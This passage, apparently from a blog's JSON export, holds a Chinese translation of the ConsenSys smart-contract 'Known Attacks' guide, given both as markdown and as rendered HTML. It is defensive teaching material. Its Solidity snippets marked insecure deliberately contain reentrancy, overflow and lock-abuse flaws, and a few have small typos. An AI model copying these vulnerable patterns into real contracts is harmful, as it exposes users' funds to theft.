public {\n\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once\n\n\trewardsForA[recipient] += 100;\n\twithdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.\n\tclaimedBonus[recipient] = true;\n}\n```\n\n即使 `getFirstWithdrawalBonus()` 没有直接调用外部合约，`withdraw()` 内的调用已经足够产生一个竞争条件的漏洞。因此你不可以信任 `withdraw()` 函数。\n```\nmapping(address => uint) private userBalances;\nmapping(address => bool) private claimedBonus;\nmapping(address => uint) private rewardsForA;\n\nfunction untrustedWithdraw(address recipient) public {\n\tuint amountToWithdraw = userBalances[recipient];\n\trewardsForA[recipient] = 0;\n\trequire(recipient.call.value(amountToWithdraw)());\n}\n\nfunction untrustedGetFirstWithdrawalBonus(address recipient) public {\n\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once\n\n\tclaimedBonus[recipient] = true;\n\trewardsForA[recipient] += 100;\n\tuntrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible\n}\n```\n\n除了修复重入的问题，[不受信任的函数也被标记了](https://consensys.github.io/smart-contract-best-practices/recommendations/#mark-untrusted-contracts)。这个模式在每个层级都被重复使用：既然 `untrustedGetFirstWithdrawalBonus()` 调用了调用了外部合约的 `untrustedWithdraw()`，那么你就必须将 `untrustedGetFirstWithdrawalBonus()` 视作不安全的。\n\n另一个经常建议的解决方案是一个 [互斥](https://en.wikipedia.org/wiki/Mutual_exclusion)。它允许你 “锁定” 某些状态，所以状态只能被锁的拥有者改变。一个简单的例子如下：\n```\n// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state\nmapping(address => uint) private balance;\nbool private lockBalances;\n\nfunction deposit() payable public returns (bool) {\n\trequire(!lockBalances);\n\tlockBalances = true;\n\tbalances[msg.sender] += msg.value;\n\tlockBalances = false;\n\treturn true;\n}\n\nfunction withdraw(uint amount) payable public returns (bool) {\n\trequire(!lockBalances && amount > 0 && balances[msg.sender] >= amount);\n\tlockBalances = true;\n\n\tif (msg.sender.call(amount)()) {\n\t\tbalances[msg.sender] -= amount;\n\t}\n\n\tlockBalances = false;\n\treturn true;\n}\n```\n\n如果用户试图在第一个调用结束前再次调用 `withdraw()`，锁就会防止其作用。这是一个有用的方式，但是当你有多个合约合作的时候，就会有一些困难。下面是不安全的：\n```\n// insecure\n\ncontract StateHolder {\n\tuint private n;\n\taddress private lockHolder;\n\n\tfunction getLock() {\n\t\trequire(lockHolder == 0);\n\t\tlockHolder = msg.sender;\n\t}\n\n\tfunction releaseLock() {\n\t\trequire(msg.sender == lockHolder);\n\t\tlockHolder = 0;\n\t}\n\n\tfunction set(uint newState) {\n\t\trequire(msg.sender == lockHolder);\n\t\tn = newState;\n\t}\n}\n```\n\n一个攻击者可以调用 `getLock()`，之后就永远不用调用 `releaseLock()`。如果他们这么干了，那么合约将被永远锁定，无法进行任何修改。如果你使用互斥来防止竞争条件，那么你需要小心地确认不会出现只能锁定而不能释放的情况。（使用互斥编程也有其他潜在的危险，如死锁和活锁。如果你想要使用这种方式，你应该查阅咨询大量互斥相关的文献资料。）\n\n###### 有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。 然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\n\n### 交易顺序依赖（TOD）/ 前台运行\n\n以上的竞争条件示例涉及到攻击者在单笔交易中执行恶意代码。以下是区块链固有的一种不同类型的竞争条件：交易本身（在区块内）的顺序容易受到操纵。\n\n在被打包进区块之前，交易会进入内存池一段时间，因此可以知道交易在被打包之前有什么行为。对于像去中心化市场这类对象来说，这可能会有些麻烦，在这种市场中，可能看到买入 token 的交易，和其他交易被包含之前的市场顺序实现形式。防止这种情况很困难，因为它会涉及到具体合约本身。举例来说，在市场中，实施批量拍卖会更好（这也可以防止高频交易问题）。另一种方法是使用预先提交方案（“我将在稍后提交细节”）。\n\n### 时间戳依赖\n\n注意区块的时间戳可以被矿工操作，所以在不管是直接还是间接的对时间戳的使用中要多加考虑。\n\n有关与时间戳相关的设计注意事项，请参阅 [建议](https://consensys.github.io/smart-contract-best-practices/recommendations/#timestamp-dependence) 部分。\n\n### 整数溢出和下溢\n\n考虑一个简单的 token 转移：\n```\nmapping(address => uint256) public balanceOf;\n\n// insecure\nfunction transfer(address _to, uint256 _value) {\n\t// check if sender has balance\n\trequire(balanceOf[msg.sender] >= _value);\n\t// add and subtract new balances\n\tbalanceOf[msg.sender] -= _value;\n\tbalanceOf[_to] += _value;\n}\n\n// secure\nfunction transfer(address _to, uint256 _value) {\n\t// check if sender has balance and for overflows\n\trequire(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);\n\n\t// add and subtract new balances\n\tbalanceOf[msg.sender] -= _value;\n\tbalanceOf[_to] += _value;\n}\n```\n\n如果余额到达了 uint 值（2^256）的最大值，它会被置为零。这是检查这个条件。这可能有关也可能无关，取决于实现方式。考虑一下 uint 值是否有这个机会达到这么大的一个数字。考虑 uint 变量是如何改变状态的，并且谁有权限来做这样的改变。如果任意用户都可以更新 uint 值，那么就会有很多的攻击漏洞。如果只有一个管理者拥有权限来修改变量的状态，那你可能是安全的。如果一个用户每次尽能增加 1，那你也可能是安全的，因为并没有可行的方式来达到限制。\n\n对于下溢来说也是一样的。如果一个 uint 被设置成小于 0，这就会导致一个下溢然后被设置成它的最大值。\n\n对 uint8, uint16, uint24... 等更小的数据类型要小心：它们会更容易的达到它们的最大值。\n\n注意这里有大约 [20 个关于溢出和下溢的例子](https://github.com/ethereum/solidity/issues/796#issuecomment-253578925)\n\n### （不期望的）回滚导致的 DoS\n\n考虑一个简单的拍卖合约：\n```\n// insecure\n\ncontract Auction {\n\taddress currentLeader;\n\tuint highestBid;\n\n\tfunction bid() payable {\n\t\trequire(msg.value > highestBid);\n\n\t\trequire(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert\n\n\t\tcurrentLeader = msg.sender;\n\t\thighestBid = msg.value;;\n\t}\n}\n```\n\n当它试图退款给用户的时候，当退款失败，它会回滚。意思是一个恶意的竞标者可以通过让它们的退款*总是*失败而变成领导者。在这个方式中，它们可以防止其他任何人调用 `bid()` 函数，然后保证自己一直都是领导者。一个推荐是如之前所述，设置一个 [拉取支付系统](https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls) 来替代。\n\n另一个例子是当一个合约想要通过便利一个数组来支付给用户（如，在众筹合约中的支持者）。通常都想要确保每一笔支付都成功。如果没有的话，就回滚。这个问题是如果一个调用失败了，你就会回滚整个支付系统，那么循环将永远不会完成。因为一个地址强制错误所以没有人获得报酬。\n\n```\naddress[] private refundAddresses;\nmapping(address => uint) public refunds;\n\n// bad\nfunction refundAll() public {\n\tfor (uint x; x < refundAddresses.length; x++) { // // arbitrary length iteration based on how many addresses participated\n\t\trequire(refundAddresses[x].send(refunds[refundAddresses[x]])) // doubly bad, now a single failure on send will hold up all funds\n\t}\n}\n```\n\n再一次，推荐的解决方法是 [赞成拉推支付](https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls)。\n\n### 区块燃料限制导致的 DoS\n\n你可能注意到了之前的例子中的另一个问题：一次性支付给所有人，你会有触及区块燃料限制的风险。每一个以太坊区块都能处理一个确定的最大算力值。如果你想要超过它，那你的交易就会失败。\n\n即使没有故意的攻击，这也会造成问题。但是，如果攻击者可以操纵所需的燃料值，就会特别糟糕。在之前的例子中，攻击者可以添加大量地址，每一个都需要获得极销量的退款。攻击者的每一个地址退款操作的燃气消耗最终可能超过燃料限制，从而阻止退款交易的发生。\n\n这是另一个 [赞成推拉支付](https://consensys.github.io/smart-contract-best-practices/recommendations#favor-pull-over-push-for-external-calls) 的原因。\n\n如果你必须完全遍历一个你不知道大小的数组，那么你应该计划它可能需要多个区块，因而需要多个交易。你会需要对你当前的进度保持跟踪，并且能够从那个点恢复，就像下面这个例子：\n```\nstruct Payee {\n\taddress addr;\n\tuint256 value;\n}\n\nPayee[] payees;\nuint256 nextPayeeIndex;\n\nfunction payOut() {\n\tuint256 i = nextPayeeIndex;\n\twhile (i < payees.length && msg.gas > 200000) {\n\t\tpayees[i].addr.send(payees[i].value);\n\t\ti++;\n\t}\n\tnextPayeeIndex = i;\n}\n```\n\n你会需要确认在等待 `payOut()` 函数的下一个遍历的时候，如果其他交易被处理，不会有不好的事情发生。所以只在完全必要的时候使用这个模式。\n\n### 强制将 ETH 发送到合约\n\n可以不通过触发合约的 fallback 函数来强行将 ETH 发送到合约。当 fallback 函数内有重要的逻辑或者进行了基于合约余额的计算时，这是一个很重要的考虑。见下面的例子：\n```\ncontract Vulnerable {\n\tfunction () payable {\n\t\trevert();\n\t}\n\n\tfunction somethingBad() {\n\t\trequire(this.balance > 0);\n\t\t// do something bad\n\t}\n}\n```\n\n合约逻辑看起来并不允许合约被支付，因此也不允许 “一些坏事” 发生。但是，存在一些强制发送 ETH 给合约的方法，因此它的余额大于 0。\n\n合约方法 `selfdestruct` 允许用户指定一个受益人发送多余的 ETH。`selfdestruct` [不会触发合约的 fallback 函数](https://solidity.readthedocs.io/en/develop/security-considerations.html#sending-and-receiving-ether)。\n\n也可以[预先计算](https://github.com/Arachnid/uscc/tree/master/submissions-2017/ricmoo)合约的地址，然后在合约部署之前给那个地址发送 ETH。\n\n合约开发者应该注意 ETH 可以被强制发送给合约并且应该设计相应的合约逻辑。通常来说，假设不可能限制你的合约的资金来源。\n\n### 废弃的 / 历史的攻击\n\n这些攻击由于协议的改变或固体的改进而不再可能发生。\n\n#### 调用深度攻击（废弃）\n\n在 EIP 150 的硬分叉中，调用深度攻击不再相关*（在达到 1024 调用深度限制之前，所有气体都将消耗得很好）。\n","slug":"智能合约最佳实践翻译三","published":1,"updated":"2018-03-26T04:00:17.800Z","layout":"post","photos":[],"link":"","_id":"cjf7piavr0016pkwotjxlvs56","content":"<h2 id=\"已知攻击\"><a href=\"#已知攻击\" class=\"headerlink\" title=\"已知攻击\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/\" target=\"_blank\" rel=\"noopener\">已知攻击</a></h2><p>以下列出了你应该知道的已知攻击，并且在编写智能合约的时候进行防御。</p>\n<h3 id=\"竞争条件-Race-Conditions\"><a href=\"#竞争条件-Race-Conditions\" class=\"headerlink\" title=\"竞争条件(Race Conditions)\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#footnote-race-condition-terminology\" target=\"_blank\" rel=\"noopener\">竞争条件</a>(Race Conditions)</h3><p>调用外部合约的一个主要危险之一是它会接管控制流，并且修改调用方法不被 期望修改的数据。这种类型的 bug 有很多形式，导致 DAO 崩溃的两个主要错误都是这类错误。</p>\n<h4 id=\"重入-Reentrancy\"><a href=\"#重入-Reentrancy\" class=\"headerlink\" title=\"重入(Reentrancy)\"></a>重入(Reentrancy)</h4><p>这个 bug 的第一个版本需要注意，这个函数可以在函数第一次调用完成之前重复调用。 这可能会导致函数的不同调用以破坏性方式进行交互。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdrawBalance() public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[msg.sender];</span><br><span class=\"line\">\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the call&apos;s code is executed, and can call withdrawBalance again</span><br><span class=\"line\">\tuserBalances[msg.sender] = 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>因为用户余额直到最后被提取完才会被设置成 0，所以第二次（和更之后）的调用仍然会成功，从而一次又一次地提取余额。一个非常类似的 bug 是 DAO 攻击中的一个漏洞。</p>\n<p>在给出的例子中，避免这个问题的最好的办法是通过 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value\" target=\"_blank\" rel=\"noopener\">使用 <code>send()</code> 代替 <code>call.value()()</code></a>。这会防止执行中的任何外部代码。</p>\n<p>然而，如果你不能移除外部调用，下一个简单地防止此攻击的方法是确保直到你完成了所有的内部工作之前都没有调用外部函数，你需要做：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdrawBalance() public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[msg.sender];</span><br><span class=\"line\">\tuserBalances[msg.sender] = 0;</span><br><span class=\"line\">\trequire(msg.sender.call.value(amountToWithdraw)());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注意，如果你有另一个调用了 <code>withdrawBalance()</code>的函数，它可能会受到相同的攻击，所以你必须对调用了不可信合约的函数也视为不可信。请参阅下方的潜在解决方案的进一步讨论。</p>\n<h4 id=\"函数交叉竞争条件-Cross-function-Race-Conditions\"><a href=\"#函数交叉竞争条件-Cross-function-Race-Conditions\" class=\"headerlink\" title=\"函数交叉竞争条件(Cross-function Race Conditions)\"></a>函数交叉竞争条件(Cross-function Race Conditions)</h4><p>一个攻击者可能使用通过两个不同的函数共享一个状态来进行类似的攻击。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function transfer(address to, uint amount) &#123;</span><br><span class=\"line\">\tif (userBalances[msg.sender] &gt;= amount) &#123;</span><br><span class=\"line\">\t\tuserBalance[to] += amount;</span><br><span class=\"line\">\t\tuserBalance[msg.sender] -= amount;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdrawBalance() public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[msg.sender];</span><br><span class=\"line\">\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller&apos;s code is executed, and can call transfer()</span><br><span class=\"line\">\tuserBalances[msg.sender] = 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在这个例子中，当攻击者的代码在 <code>withdrawBalance()</code> 中的外部调用中被执行，攻击者会调用 <code>transfer()</code>。只要他们的余额不是 0，那么他们就可以在已经收到过一次提币的情况下，再次转移 token。这个漏洞也在 DAO 攻击中被使用。</p>\n<p>在相同的警告下，相同的解决方案也会起作用。也要注意，在这个例子中，函数都是同一个合约的一部分。但是，如果多个合约共享状态，那么相同的 bug 也可以出现在交叉的多重合约中。</p>\n<h4 id=\"竞争条件解决方案中的陷阱\"><a href=\"#竞争条件解决方案中的陷阱\" class=\"headerlink\" title=\"竞争条件解决方案中的陷阱\"></a>竞争条件解决方案中的陷阱</h4><p>因为竞争条件可以在多个函数，甚至多个合约中发生，所以任何旨在防止重入的解决方案都是不够的。</p>\n<p>相反，我们推荐在完成全部的内部工作之后再调用外部函数。如果你小心地遵循了这个规则，就可以避免竞争条件。但是，你不止要避免太早调用外部函数，也要避免调用了外部函数的函数。举例来说，下面是不安全的：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\">mapping(address =&gt; bool) private claimedBonus;</span><br><span class=\"line\">mapping(address =&gt; uint) private rewardsForA;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw(address recipient) public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[recipient];</span><br><span class=\"line\">\trewardsForA[recipient] = 0;</span><br><span class=\"line\">\trequire(recipient.call.value(amountToWithdraw)());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function getFirstWithdrawalBonus(address recipient) public &#123;</span><br><span class=\"line\">\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once</span><br><span class=\"line\"></span><br><span class=\"line\">\trewardsForA[recipient] += 100;</span><br><span class=\"line\">\twithdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.</span><br><span class=\"line\">\tclaimedBonus[recipient] = true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>即使 <code>getFirstWithdrawalBonus()</code> 没有直接调用外部合约，<code>withdraw()</code> 内的调用已经足够产生一个竞争条件的漏洞。因此你不可以信任 <code>withdraw()</code> 函数。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\">mapping(address =&gt; bool) private claimedBonus;</span><br><span class=\"line\">mapping(address =&gt; uint) private rewardsForA;</span><br><span class=\"line\"></span><br><span class=\"line\">function untrustedWithdraw(address recipient) public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[recipient];</span><br><span class=\"line\">\trewardsForA[recipient] = 0;</span><br><span class=\"line\">\trequire(recipient.call.value(amountToWithdraw)());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function untrustedGetFirstWithdrawalBonus(address recipient) public &#123;</span><br><span class=\"line\">\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once</span><br><span class=\"line\"></span><br><span class=\"line\">\tclaimedBonus[recipient] = true;</span><br><span class=\"line\">\trewardsForA[recipient] += 100;</span><br><span class=\"line\">\tuntrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>除了修复重入的问题，<a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#mark-untrusted-contracts\" target=\"_blank\" rel=\"noopener\">不受信任的函数也被标记了</a>。这个模式在每个层级都被重复使用：既然 <code>untrustedGetFirstWithdrawalBonus()</code> 调用了调用了外部合约的 <code>untrustedWithdraw()</code>，那么你就必须将 <code>untrustedGetFirstWithdrawalBonus()</code> 视作不安全的。</p>\n<p>另一个经常建议的解决方案是一个 <a href=\"https://en.wikipedia.org/wiki/Mutual_exclusion\" target=\"_blank\" rel=\"noopener\">互斥</a>。它允许你 “锁定” 某些状态，所以状态只能被锁的拥有者改变。一个简单的例子如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state</span><br><span class=\"line\">mapping(address =&gt; uint) private balance;</span><br><span class=\"line\">bool private lockBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function deposit() payable public returns (bool) &#123;</span><br><span class=\"line\">\trequire(!lockBalances);</span><br><span class=\"line\">\tlockBalances = true;</span><br><span class=\"line\">\tbalances[msg.sender] += msg.value;</span><br><span class=\"line\">\tlockBalances = false;</span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw(uint amount) payable public returns (bool) &#123;</span><br><span class=\"line\">\trequire(!lockBalances &amp;&amp; amount &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class=\"line\">\tlockBalances = true;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (msg.sender.call(amount)()) &#123;</span><br><span class=\"line\">\t\tbalances[msg.sender] -= amount;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlockBalances = false;</span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果用户试图在第一个调用结束前再次调用 <code>withdraw()</code>，锁就会防止其作用。这是一个有用的方式，但是当你有多个合约合作的时候，就会有一些困难。下面是不安全的：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">contract StateHolder &#123;</span><br><span class=\"line\">\tuint private n;</span><br><span class=\"line\">\taddress private lockHolder;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction getLock() &#123;</span><br><span class=\"line\">\t\trequire(lockHolder == 0);</span><br><span class=\"line\">\t\tlockHolder = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction releaseLock() &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == lockHolder);</span><br><span class=\"line\">\t\tlockHolder = 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction set(uint newState) &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == lockHolder);</span><br><span class=\"line\">\t\tn = newState;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>一个攻击者可以调用 <code>getLock()</code>，之后就永远不用调用 <code>releaseLock()</code>。如果他们这么干了，那么合约将被永远锁定，无法进行任何修改。如果你使用互斥来防止竞争条件，那么你需要小心地确认不会出现只能锁定而不能释放的情况。（使用互斥编程也有其他潜在的危险，如死锁和活锁。如果你想要使用这种方式，你应该查阅咨询大量互斥相关的文献资料。）</p>\n<h6 id=\"有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。-然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\"><a href=\"#有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。-然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\" class=\"headerlink\" title=\"有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。 然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\"></a>有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。 然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。</h6><h3 id=\"交易顺序依赖（TOD）-前台运行\"><a href=\"#交易顺序依赖（TOD）-前台运行\" class=\"headerlink\" title=\"交易顺序依赖（TOD）/ 前台运行\"></a>交易顺序依赖（TOD）/ 前台运行</h3><p>以上的竞争条件示例涉及到攻击者在单笔交易中执行恶意代码。以下是区块链固有的一种不同类型的竞争条件：交易本身（在区块内）的顺序容易受到操纵。</p>\n<p>在被打包进区块之前，交易会进入内存池一段时间，因此可以知道交易在被打包之前有什么行为。对于像去中心化市场这类对象来说，这可能会有些麻烦，在这种市场中，可能看到买入 token 的交易，和其他交易被包含之前的市场顺序实现形式。防止这种情况很困难，因为它会涉及到具体合约本身。举例来说，在市场中，实施批量拍卖会更好（这也可以防止高频交易问题）。另一种方法是使用预先提交方案（“我将在稍后提交细节”）。</p>\n<h3 id=\"时间戳依赖\"><a href=\"#时间戳依赖\" class=\"headerlink\" title=\"时间戳依赖\"></a>时间戳依赖</h3><p>注意区块的时间戳可以被矿工操作，所以在不管是直接还是间接的对时间戳的使用中要多加考虑。</p>\n<p>有关与时间戳相关的设计注意事项，请参阅 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#timestamp-dependence\" target=\"_blank\" rel=\"noopener\">建议</a> 部分。</p>\n<h3 id=\"整数溢出和下溢\"><a href=\"#整数溢出和下溢\" class=\"headerlink\" title=\"整数溢出和下溢\"></a>整数溢出和下溢</h3><p>考虑一个简单的 token 转移：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mapping(address =&gt; uint256) public balanceOf;</span><br><span class=\"line\"></span><br><span class=\"line\">// insecure</span><br><span class=\"line\">function transfer(address _to, uint256 _value) &#123;</span><br><span class=\"line\">\t// check if sender has balance</span><br><span class=\"line\">\trequire(balanceOf[msg.sender] &gt;= _value);</span><br><span class=\"line\">\t// add and subtract new balances</span><br><span class=\"line\">\tbalanceOf[msg.sender] -= _value;</span><br><span class=\"line\">\tbalanceOf[_to] += _value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// secure</span><br><span class=\"line\">function transfer(address _to, uint256 _value) &#123;</span><br><span class=\"line\">\t// check if sender has balance and for overflows</span><br><span class=\"line\">\trequire(balanceOf[msg.sender] &gt;= _value &amp;&amp; balanceOf[_to] + _value &gt;= balanceOf[_to]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// add and subtract new balances</span><br><span class=\"line\">\tbalanceOf[msg.sender] -= _value;</span><br><span class=\"line\">\tbalanceOf[_to] += _value;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果余额到达了 uint 值（2^256）的最大值，它会被置为零。这是检查这个条件。这可能有关也可能无关，取决于实现方式。考虑一下 uint 值是否有这个机会达到这么大的一个数字。考虑 uint 变量是如何改变状态的，并且谁有权限来做这样的改变。如果任意用户都可以更新 uint 值，那么就会有很多的攻击漏洞。如果只有一个管理者拥有权限来修改变量的状态，那你可能是安全的。如果一个用户每次尽能增加 1，那你也可能是安全的，因为并没有可行的方式来达到限制。</p>\n<p>对于下溢来说也是一样的。如果一个 uint 被设置成小于 0，这就会导致一个下溢然后被设置成它的最大值。</p>\n<p>对 uint8, uint16, uint24… 等更小的数据类型要小心：它们会更容易的达到它们的最大值。</p>\n<p>注意这里有大约 <a href=\"https://github.com/ethereum/solidity/issues/796#issuecomment-253578925\" target=\"_blank\" rel=\"noopener\">20 个关于溢出和下溢的例子</a></p>\n<h3 id=\"（不期望的）回滚导致的-DoS\"><a href=\"#（不期望的）回滚导致的-DoS\" class=\"headerlink\" title=\"（不期望的）回滚导致的 DoS\"></a>（不期望的）回滚导致的 DoS</h3><p>考虑一个简单的拍卖合约：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 